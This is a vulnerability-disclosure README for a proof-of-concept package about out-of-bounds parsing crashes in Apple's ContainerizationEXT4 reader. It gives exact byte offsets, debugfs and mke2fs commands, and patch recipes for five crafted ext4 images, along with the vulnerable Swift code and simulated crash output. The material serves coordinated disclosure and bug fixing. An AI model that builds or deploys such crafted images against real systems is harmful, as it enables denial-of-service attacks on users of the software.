# PoC for OE1107563755116 — ContainerizationEXT4 out-of-bounds parsing

Apple Product Security asked for *"a working proof of concept that
demonstrates the crash on a current macOS build, including a crafted ext4
image and reproduction steps"*. This package covers **every** bug and every
code path described in the original report, including the one the report
explicitly flagged as unverified ("has the same shape of bug one level
down") — not just a single depth=0 case:

| Image | Function | Bug |
|---|---|---|
| `poc.img` | `getExtents(inode:)`, depth==0 branch | `header.entries` used as a loop bound with no check it fits the 60-byte `i_block` buffer |
| `poc_root_construction.img` | same, but on the **root inode** | crashes inside `EXT4Reader(blockDevice:)` itself — `init` eagerly walks the tree from root, so this never even reaches `export()` |
| `poc_depth1.img` | `getExtents(inode:)`, **depth==1 branch** | `leafHeader.entries`, read from a disk block pointed to by an index node, used as a loop bound with no check against the 4096-byte block buffer — the "one level down" case the report flagged but didn't test |
| `poc_dirbug_recordlength.img` | `getDirEntries(dirTree:)` | loop condition only checks `offset < dirTree.count`, not `offset + entrySize <= dirTree.count` |
| `poc_dirbug_namelength.img` | `getDirEntries(dirTree:)` | `nameLength` never checked against remaining buffer space before slicing the name |

All five are **real, tool-built ext4 filesystems** (`mke2fs`/`debugfs`) with
exactly one legitimately-allocated block hand-patched. Nothing here is a
synthetic byte blob assembled from scratch — every image opens, has a real
superblock/group descriptors/inode table, and the crafted block sits at the
same offset a real file/directory's data would.

Everything was re-verified against a fresh clone of `apple/containerization`
and `apple/container` `main` on 2026-08-27 before building this — the code
paths below are quoted from that pull, not from the original report.

**On "demonstrates the crash on a current macOS build" specifically:**
everything in this package was built and verified without access to a Mac
(no Apple hardware was available while preparing it). The images are real
(built with `mke2fs`/`debugfs`, not synthetic bytes) and every crash point
is independently confirmed by re-running the actual Swift parsing logic
against the real image bytes in Python — but that is not the same as
watching the Swift trap happen. To close that specific gap without needing
physical Apple hardware, `.github/workflows/poc.yml` runs the harness on
GitHub's hosted macOS runner (a real Apple-provided macOS 26/Xcode 26
virtual machine) and captures the actual trap output. See **Option D**
below — this is the one piece here that produces a real, first-party
"ran on macOS" result rather than a strong prediction of one.

## Contents

- **`poc.img`** — 8MB image, one regular file (`poc-trigger`, inode 12).
  `ExtentHeader.entries` patched from `1` to `5`; `magic` (`0xF30A`) and
  `depth` (`0`) untouched.
- **`poc_root_construction.img`** — same 2-byte patch, applied to inode 2
  (the filesystem root) instead of a regular file. `getDirTree` calls
  `getExtents(inode:)` on its own inode before reading any children, and
  `EXT4Reader.init(blockDevice:)` calls `getDirTree` on the root inode before
  `init` even returns — so opening this image at all is enough to crash;
  `export()`/`children(of:)` are never reached. This is the most minimal
  possible trigger: no separate victim file needed, and it proves the bug is
  reachable from simply constructing an `EXT4Reader`, not only from export.
- **`poc_depth1.img`** — 8MB image, one regular file (inode 12) whose
  `i_block` was rewritten to a valid `depth=1` index node (`entries=1`,
  pointing at the file's own real data block, 1161). Block 1161 itself was
  then rewritten as a fake leaf node: valid `magic`, `entries=1000` (real
  capacity of a 4096-byte block is 340 leaves). This exercises a completely
  different buffer than the other two `getExtents` images — a full disk
  block read via `seek(block:)`/`handle.read(upToCount:)`, not the 60-byte
  inline `i_block` — confirming the report's claim that the depth==1 branch
  has the identical missing-bounds-check shape one level down.
- **`poc_dirbug_recordlength.img`** — 8MB image, one subdirectory
  (`dirvictim`, inode 12) whose data block has been fully rewritten: a `"."`
  entry, then a `".."` entry whose `recordLength` is deliberately 4 bytes
  short of the block end, leaving an unclaimed 4-byte tail (< the 8-byte
  entry header size).
- **`poc_dirbug_namelength.img`** — same subdirectory, block rewritten with
  a `"."` entry, an `inode==0` filler entry that skips forward to byte 4056,
  then a final entry at the very end of the block with `recordLength=40`
  (valid) but `nameLength=200` (only 32 bytes actually remain).
- **`simulate_crash.py`** / **`simulate_dir_crash.py`** / **`simulate_depth1_crash.py`**
  — byte-for-byte re-implementations of each Swift loop, run against the
  *real* image bytes, so the exact out-of-range `subdata` call can be
  confirmed without a Swift toolchain.
- **`ext4-crash-poc/`** *(this directory)* — SwiftPM executable that calls
  `EXT4.EXT4Reader(blockDevice:).export(archive:)` — the exact public API
  `container export` calls — against whichever image you point it at.
- **`run_all.sh`** — runs the harness against all five images in sequence
  (each in its own process, since a crash ends the process) and prints
  PASS/FAIL per image.

## Option A — fastest: SwiftPM harness

```bash
swift build
swift run ext4-crash-poc poc.img                       # Bug 1 (file inode, depth=0)
swift run ext4-crash-poc poc_root_construction.img      # Bug 1 (root inode -- crashes on open)
swift run ext4-crash-poc poc_depth1.img                 # Bug 1b (depth=1 index-node branch)
swift run ext4-crash-poc poc_dirbug_recordlength.img    # Bug 2a
swift run ext4-crash-poc poc_dirbug_namelength.img      # Bug 2b
```

Or just:

```bash
swift build && ./run_all.sh
```

The first, third, fourth, and fifth should print through `"Calling
reader.export(archive:)..."` and then die with a Swift runtime trap
(out-of-range `Data` subrange fault), not a thrown, catchable `EXT4.Error`.
`poc_root_construction.img` traps one line earlier — during
`EXT4.EXT4Reader(blockDevice:)` itself, since `init` eagerly walks the tree
from the root inode before returning. `Package.swift` pins
`containerization` to `branch: "main"` — repoint that at the tag/commit
you're validating against.

## Option B — most faithful: real `container export`

Same as before: swap a stopped container's rootfs block file for one of
these images (or apply the equivalent single-field patch to a real rootfs,
re-deriving offsets with `dumpe2fs`/`debugfs stat` since block-group layout
will differ), then run `container export <id> out.tar`.

## Option C — no Swift needed, verify against the real bytes first

```bash
python3 simulate_crash.py poc.img 12
python3 simulate_depth1_crash.py poc_depth1.img 12
python3 simulate_dir_crash.py poc_dirbug_recordlength.img
python3 simulate_dir_crash.py poc_dirbug_namelength.img
```

Output for the depth==1 image:

```
inode 12 i_block: magic=0xf30a entries=1 max=4 depth=1
  index 0: block=0 leafLow=1161  -> seek(block: 1161)
    leaf block header: magic=0xf30a entries=1000 max=340 depth=0  (buffer is 4096 bytes, real capacity = 340 leaves)
    leaf iter 340: block.subdata(in: 4092..<4104)  [*** OUT OF RANGE -> traps, 4096-byte buffer ***]

CRASH CONFIRMED (depth==1 branch): leaf read 340 at block-offset 4092 needs
12 bytes but only 4 remain in the 4096-byte disk block.
```

Output for the two directory images:

```
=== poc_dirbug_recordlength.img ===
  iter 0: header @ 0..<8 OK  (inode=12 recordLength=12 nameLength=1 fileType=2)
    name @ 8..<9 OK
  iter 1: header @ 12..<20 OK  (inode=2 recordLength=4080 nameLength=2 fileType=2)
    name @ 20..<22 OK
  iter 2: dirTree.subdata(in: 4092..<4100)  [*** OUT OF RANGE (header read) -> traps, 4096-byte buffer ***]

CRASH CONFIRMED (Bug A / record-length gap): header read at offset 4092
needs 8 bytes but only 4 remain.

=== poc_dirbug_namelength.img ===
  iter 0: header @ 0..<8 OK  (inode=12 recordLength=12 nameLength=1 fileType=2)
    name @ 8..<9 OK
  iter 1: header @ 12..<20 OK  (inode=0 recordLength=4044 nameLength=0 fileType=2)
    inode==0 -> skip, offset += 4044
  iter 2: header @ 4056..<4064 OK  (inode=12 recordLength=40 nameLength=200 fileType=1)
  iter 2: dirTree.subdata(in: 4064..<4264)  [*** OUT OF RANGE (name read) -> traps, 4096-byte buffer ***]

CRASH CONFIRMED (Bug B / nameLength gap): name read at offset 4064 requests
200 bytes (to 4264) but only 32 remain.
```

## Option D — actual proof on real macOS, no Mac required (recommended)

This is the option that most directly answers Apple's specific ask. Instead
of running the harness on hardware neither the reporter nor this tool had
access to, `.github/workflows/poc.yml` runs it on GitHub's own hosted macOS
runner — a real, Apple-provided macOS 26 (Tahoe) virtual machine with Xcode
26 preinstalled, which satisfies this package's `macOS 15.0` minimum and
`swift-tools-version: 6.2` requirement.

1. Create a new GitHub repository (public or private both work).
2. Push the entire contents of this `ext4-crash-poc/` folder to it,
   including the `.github/workflows/poc.yml` file.
3. In the repo, go to the **Actions** tab → select the **ext4-crash-poc**
   workflow → **Run workflow**. (It also runs automatically on push to
   `main`.)
4. Open the completed run. The job summary shows the output of all five
   images run one after another; a "PASS (crashed as expected, exit status
   N)" line for an image means that Swift process actually trapped on real
   macOS. The same output is also uploaded as a downloadable artifact
   (`ext4-crash-poc-macos-log`) so it can be attached directly to the
   report.
5. Link the workflow run (and/or attach the downloaded log) in your reply
   to Apple — it's a real, independently-timestamped, Apple-infrastructure
   execution of the exact reproduction steps below, not a claim.

If GitHub changes the default macOS image again, edit `runs-on:` in
`.github/workflows/poc.yml` to any label satisfying macOS ≥ 15
(`macos-15`, `macos-26`, etc. — see
[actions/runner-images](https://github.com/actions/runner-images) for the
current list).

## How each image was built

All five start identically:

```bash
dd if=/dev/zero of=IMG bs=1M count=8
mke2fs -q -t ext4 -O extent,^resize_inode -I 256 -F IMG
```

**`poc.img`**: add a real file, then patch 2 bytes.

```bash
echo "..." > trigger.txt
debugfs -w -R "write trigger.txt poc-trigger" IMG   # allocates inode 12
```
```
BEFORE (bytes at inode 12's i_block+2): entries=1  (magic=0xf30a max=4 depth=0)
AFTER:                                  entries=5
```
Offsets: `dumpe2fs` showed inode table at block 34, inode size 256 ⇒
`inode_offset = 34*4096 + (12-1)*256 = 142080`; `i_block` starts at struct
offset 40; `ExtentHeader.entries` is the 2nd `UInt16` in the header
(offset 40+2 = 42 within the inode).

**`poc_root_construction.img`**: identical 2-byte patch, no extra file —
applied directly to inode **2** (`inode_offset = 34*4096 + (2-1)*256 =
139520`), which every freshly-made ext4 filesystem already has as a valid
extent-based directory inode. No `debugfs write` step needed.

Note: patching an inode this way changes its content without recomputing
`metadata_csum`'s per-inode checksum, so `debugfs stat` on the patched inode
will report a checksum mismatch. That's expected and harmless for this
PoC — confirmed from source that `EXT4Reader` never validates inode
checksums, only `ExtentHeader.magic` — but don't be surprised by it if you
inspect the image with standard Linux tools first.

**`poc_depth1.img`**: two separate patches on real, already-allocated
structures — no bytes outside the image's real layout are touched.

```bash
echo "hello depth1 target" > trigger2.txt
debugfs -w -R "write trigger2.txt poc-depth1-trigger" IMG   # inode 12, real data block 1161
```

1. Inode 12's 60-byte `i_block` is fully rewritten (not just one field) to a
   valid depth=1 index node: `ExtentHeader{magic=0xF30A, entries=1, max=4,
   depth=1}` followed by one `ExtentIndex{block=0, leafLow=1161}` — pointing
   at the file's own real, already-allocated data block.
2. Block **1161 itself** (a real disk block, addressed the same way
   `seek(block:)` addresses it: `block_num * blockSize`) is fully rewritten
   as a fake leaf node: `ExtentHeader{magic=0xF30A, entries=1000, max=340,
   depth=0}`. A 4096-byte block can only really hold `(4096-12)/12 = 340`
   `ExtentLeaf` entries; claiming 1000 makes the unchecked loop walk off the
   end of the block at leaf index 340.

This exercises a structurally different buffer than the other two
`getExtents` images: a full disk block fetched via `self.seek(block:)` +
`self.handle.read(upToCount:)`, not the inline 60-byte `i_block`. Confirmed
against source: the depth==1 branch checks `leafHeader.magic` (throwing a
catchable `Error.invalidExtents` if it's wrong) but never checks
`leafHeader.entries` against the block's actual size — the identical gap as
the depth==0 case, one level down, exactly as the original report
predicted but did not test.

**`poc_dirbug_recordlength.img` / `poc_dirbug_namelength.img`**: add a real
subdirectory, then overwrite its one data block entirely with hand-built
`DirectoryEntry` records (still just editing already-allocated, real
filesystem bytes — no bytes outside the image's real structure are
touched):

```bash
debugfs -w -R "mkdir dirvictim" IMG   # inode 12, single data block 1161
```

`DirectoryEntry` layout (`EXT4+Types.swift`): `inode: UInt32, recordLength:
UInt16, nameLength: UInt8, fileType: UInt8` = 8-byte header, name bytes
follow, zero-padded out to `recordLength`.

Each entry's raw bytes are zero-padded to its own declared `recordLength`
before the next entry is appended — this matters: `recordLength` isn't just
a loop-bound hint, it also determines where the *next* entry's real bytes
physically start.

## Source confirmation (re-verified 2026-08-27 against `main`)

`getDirEntries(dirTree:)` (`Sources/ContainerizationEXT4/EXT4+Reader.swift`):

```swift
var offset = 0
let entrySize = MemoryLayout<DirectoryEntry>.size   // 8
while offset < dirTree.count {
    let dirEntry = dirTree.subdata(in: offset..<offset + entrySize).withUnsafeBytes {
        $0.loadLittleEndian(as: DirectoryEntry.self)
    }
    guard dirEntry.recordLength >= entrySize else { break }
    if dirEntry.inode == 0 {
        offset += Int(dirEntry.recordLength)
        continue
    }
    let nameData = dirTree.subdata(in: offset + 8..<offset + 8 + Int(dirEntry.nameLength))
    ...
    offset += Int(dirEntry.recordLength)
}
```

Confirms both claims in the report exactly: the outer loop bound (`offset <
dirTree.count`) doesn't guarantee `entrySize` bytes remain before the next
header read, and `nameLength` is used to slice `nameData` with no check
against remaining buffer space.

`getExtents(inode:)`, depth==1 branch (same file) — the code path the
original report described but never tested:

```swift
case 1:
    for _ in 0..<header.entries {
        let indexNode = inodeBlock.subdata(...) // ExtentIndex
        try self.seek(block: indexNode.leafLow)
        let block = try self.handle.read(upToCount: Int(self.blockSize))
        let leafHeader = block.subdata(in: 0..<extentHeaderSize)...
        guard leafHeader.magic == EXT4.ExtentHeaderMagic else {
            throw Error.invalidExtents   // this check IS present and catchable
        }
        for _ in 0..<leafHeader.entries {   // <-- NOT checked against block.count
            let leaf = block.subdata(in: blockOffset..<blockOffset + extentLeafSize)...
            blockOffset += extentLeafSize
        }
    }
```

Confirms the report's "same shape of bug one level down" claim precisely:
the magic check exists and is catchable, but `leafHeader.entries` — read
from attacker-controlled disk block content — is used as a loop bound
against a 4096-byte buffer with no equivalent check.

Also re-confirmed unchanged: `EXT4.EXT4Reader(blockDevice:)`'s public
initializer, `export(archive:)`'s `public` access, and
`ContainersService.exportRootfs`'s call site (`apple/container`,
`Sources/Services/ContainerAPIService/Server/Containers/ContainersService.swift`,
~L914-916) — see inline comments in `Sources/ext4-crash-poc/main.swift`.
